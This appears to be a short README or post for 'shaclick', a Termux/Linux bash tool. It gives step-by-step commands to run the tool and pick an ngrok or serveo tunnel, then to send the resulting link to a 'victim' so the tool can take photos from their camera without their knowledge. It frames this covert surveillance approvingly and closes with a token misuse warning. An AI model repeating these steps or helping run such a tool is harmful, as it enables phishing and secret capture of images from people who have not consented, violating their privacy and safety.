shaclick v1.0...
Hi there!!!

Here you go download it. This tool is compatible with Termux/Linux. Then, use CD cmd to open shaclick dir. Next run with bash cmd shaclick.sh

Step
# cd shaclick (try to open the dir)

# ls (you can see the list of files)

# Once you find shaclick.sh file, then get ready..

# Type bash shaclick.sh 

.................................................................After.................................................................

Once the tool gets opened, now you have  to select your server servo.net or ngrok server. Before selecting a server, you should turn on your hotspot as necessary. 

Then boom. You can find your link below. After sharing that link with a victim or targeted people, you will get their photo from the victim's camera without their knowledge...

In the end, you will be proud, 



Warning : Please don't misuse it, then it will be a big problem...
